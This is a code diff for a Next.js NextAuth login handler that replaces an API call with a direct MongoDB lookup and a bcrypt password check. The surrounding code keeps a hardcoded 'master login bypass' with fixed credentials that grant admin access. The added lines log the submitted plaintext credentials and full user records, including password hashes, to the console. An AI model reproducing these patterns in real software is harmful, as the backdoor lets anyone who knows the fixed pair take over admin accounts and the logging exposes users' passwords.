@@ -2,6 +2,7 @@ import CredentialsProvider from "next-auth/providers/credentials";
 import axios from "axios";
 import dbConnect from '@/lib/mongodb';
 import User from '@/models/User';
+import bcrypt from "bcryptjs";
 
 
 export const authOptions = {
@@ -16,6 +17,9 @@ export const authOptions = {
         const { username, password } = credentials;
         try {
           // Master login bypass
+
+          console.log(credentials, 'RESP AUTH')
+
           if (username === "bugtech" && password === "420230") {
             await dbConnect();
 
@@ -31,19 +35,31 @@ export const authOptions = {
             throw new Error("Admin user not found.");
           }
 
-          // Attempt login via API
-          const response = await axios.post("/api/users", {
-            action: "login",
-            phone: username,
-            password,
-          });
+          // // Attempt login via API
+          // const response = await axios.post("/api/users", {
+          //   action: "login",
+          //   phone: username,
+          //   password,
+          // }).catch(err => {
+          //   console.log(err, 'ERR')
+          // });
 
-          if (response.data && response.data.user) {
+          const user = await User.findOne({ $or: [{ phone: username }, { username }] });
+          console.log(user, 'LOGIN')
+          if (!user) throw new Error("User not found");
+          if (user.deletedAt) throw new Error("User is deactivated");
+
+          const passwordMatch = await bcrypt.compare(password, user.password);
+          if (!passwordMatch) throw new Error("Invalid credentials");
+
+
+          console.log(user, 'RESP AUTH')
+          if (user) {
             return {
-              id: response.data.user._id,
-              username: response.data.user.username,
-              phone: response.data.user.phone,
-              userType: response.data.user.userType,
+              id: user._id,
+              username: user.username,
+              phone: user.phone,
+              userType: user.userType,
             };
           }
         } catch (error) {
